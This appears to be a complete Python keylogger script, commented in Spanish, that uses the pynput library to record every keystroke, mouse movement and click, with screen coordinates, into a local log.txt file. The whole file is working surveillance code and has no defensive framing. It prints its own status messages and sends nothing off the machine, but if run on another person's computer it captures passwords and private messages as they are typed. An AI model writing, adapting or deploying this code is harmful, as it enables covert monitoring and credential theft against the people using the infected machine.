# Librerías necesarias
import os
import time
from pynput import keyboard, mouse

# Clase del Keylogger
class Keylog:
    def __init__(self):
        "Inicializa la ruta del archivo y los listeners"
        self.loggerpath = os.path.join(os.getcwd(), "log.txt")
        self.keyboard_listener = None
        self.mouse_listener = None

    def pathCheck(self):
        "Verifica si existe el archivo log.txt, si no lo crea"
        if not os.path.exists(self.loggerpath):
            print("Creando archivo log...")
            time.sleep(0.5)
            open(self.loggerpath, "w").close()
            time.sleep(0.5)
            print("Archivo creado")

    def start_listening(self):
        "Inicia los listeners de teclado y mouse"
        self.keyboard_listener = keyboard.Listener(on_press=self.keylogger)
        self.mouse_listener = mouse.Listener(on_move=self.mouselogger, on_click=self.mouseclick)
        self.keyboard_listener.start()
        self.mouse_listener.start()
        print("Escuchando teclas y mouse...")

        self.keyboard_listener.join()
        self.mouse_listener.join()

    def keylogger(self, key):
        "Captura las teclas presionadas y las guarda en el log"
        try:
            with open(self.loggerpath, "a") as log:
                log.write(f"[TECLA] {key}\n")
        except Exception as e:
            print(f"Error al registrar tecla: {e}")

    def mouselogger(self, x, y):
        "Registra el movimiento del mouse"
        try:
            with open(self.loggerpath, "a") as log:
                log.write(f"[MOUSE MOVE] Posición: {x}, {y}\n")
        except Exception as e:
            print(f"Error al registrar movimiento: {e}")

    def mouseclick(self, x, y, button, pressed):
        "Registra los clics del mouse"
        try:
            with open(self.loggerpath, "a") as log:
                estado = "Presionado" if pressed else "Soltado"
                log.write(f"[CLICK] {button} {estado} en ({x}, {y})\n")
        except Exception as e:
            print(f"Error al registrar clic: {e}")

# Función principal
def main():
    keylogger = Keylog()
    keylogger.pathCheck()
    keylogger.start_listening()

# Solo se ejecuta si es el archivo principal
if __name__ == "__main__":
    print("Keylogger iniciado")
    main()
